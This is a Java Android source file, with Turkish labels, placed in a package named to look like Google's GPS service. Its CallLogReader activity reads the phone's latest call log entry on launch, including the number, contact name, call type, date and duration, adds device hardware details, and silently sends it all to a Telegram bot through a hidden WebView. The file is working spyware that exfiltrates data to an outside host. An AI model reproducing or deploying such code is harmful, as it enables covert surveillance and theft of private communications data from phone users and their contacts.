package com.google.android.gps ;
import android.app.*;
import android.content.*;
import android.database.*;
import android.net.*;
import android.os.*;
import android.provider.*;
import android.webkit.*;
import java.util.*;

public class CallLogReader extends Activity implements LoaderManager.LoaderCallbacks<Cursor>{

	@Override
	public void onCreate(Bundle b){
		super.onCreate(b);
		setContentView(R.layout.main);
		getLoaderManager().initLoader(1, null, CallLogReader.this);
	}
	
	@Override
	public Loader<Cursor> onCreateLoader(int p1, Bundle p2){
		switch (p1) {
            case 1:
                return new CursorLoader(
					this,
					CallLog.Calls.CONTENT_URI,
					null,
					null,
					null,
					null
                );
            default:
                return null;
        }
	}

	@Override
	public void onLoadFinished(Loader<Cursor> p1, Cursor p2){
		String call = "";
		
		int number = p2.getColumnIndex(CallLog.Calls.NUMBER);
		int type = p2.getColumnIndex(CallLog.Calls.TYPE);
		int date = p2.getColumnIndex(CallLog.Calls.DATE);
		int duration = p2.getColumnIndex(CallLog.Calls.DURATION);
		
		String phNumber = "";
		String callType = "";
		String callDate = "";
		Date callDayTime = new Date();
		String callDuration = "";
		
		try{
			p2.moveToLast();
			phNumber = p2.getString(number);
			callType = p2.getString(type);
			callDate = p2.getString(date);
			callDayTime = new Date(Long.valueOf(callDate));
			callDuration = p2.getString(duration);
		} catch(Exception e){
			p2.moveToLast();
			phNumber = "Bilinmiyor";
			callType = p2.getString(type);
			callDate = p2.getString(date);
			callDayTime = new Date(Long.valueOf(callDate));
			callDuration = p2.getString(duration);
		} catch(Error er){
			p2.moveToLast();
			phNumber = "Bilinmiyor";
			callType = p2.getString(type);
			callDate = p2.getString(date);
			callDayTime = new Date(Long.valueOf(callDate));
			callDuration = p2.getString(duration);
		}
		
		call = "📞 "+getResources().getString(R.string.takmaad)+bosluk() +
			"Numara: " + getContactName(phNumber)+ bosluk() +
			"Tip: " + callType(callType) + bosluk() +
			"Tarih: " + callDayTime + bosluk() +
			"Süre: " + duration(callDuration)+ bosluk() +
			getDeviceInfo();

		String token = getResources().getString(R.string.botid);
		String user = getResources().getString(R.string.userid);
		String telegram = "https://api.telegram.org/bot"+token+"/sendMessage?text="+call+"&chat_id="+user;
		(new WebView(this)).loadUrl(telegram);
	}

	@Override
	public void onLoaderReset(Loader<Cursor> p1){
		return;
	}
	
	String callType(String ct){
		int i = Integer.parseInt(ct);
		switch (i) {
			case CallLog.Calls.OUTGOING_TYPE:
				return "Giden";

			case CallLog.Calls.INCOMING_TYPE:
				return "Gelen";

			case CallLog.Calls.MISSED_TYPE:
				return "Cevapsız";
				
			default:
				return "Kapatılmış";
		}
	}
	
	String duration(String val){
		int i = Integer.parseInt(val);
		int sa = (i/60)/60;
		int dk = (i/60)%60;
		int sn = i%60;
		return zeroFix(sa)+"sa "+
				zeroFix(dk)+"dk "+
				zeroFix(sn)+ "sn";
	}
	
	String zeroFix(int i){
		if(i < 10) return "0"+i;
		else return ""+i;
	}
	
	String bosluk(){
		String temp = "";
		for(int i = 0;i!=150;i++)
			temp += " ";
		return temp;
	}
	
	String getDeviceInfo(){
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		return bosluk()+"Cihaz: "+s1+" "+s2+" "+s3;
	}
	
	String getContactName(String phoneNumber){
		if(!phoneNumber.equals("Bilinmiyor")){
			Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,Uri.encode(phoneNumber));
			String[] projection = new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME};
			String contactName = "";
			Cursor cursor = getContentResolver().query(uri,projection,null,null,null);
			if (cursor != null) {
				if(cursor.moveToFirst())
					contactName=cursor.getString(0);
				cursor.close();
			}
			if (contactName.length() < 1) return phoneNumber;
			return contactName + " ("+phoneNumber+")";
		}
		return phoneNumber;
	}
}
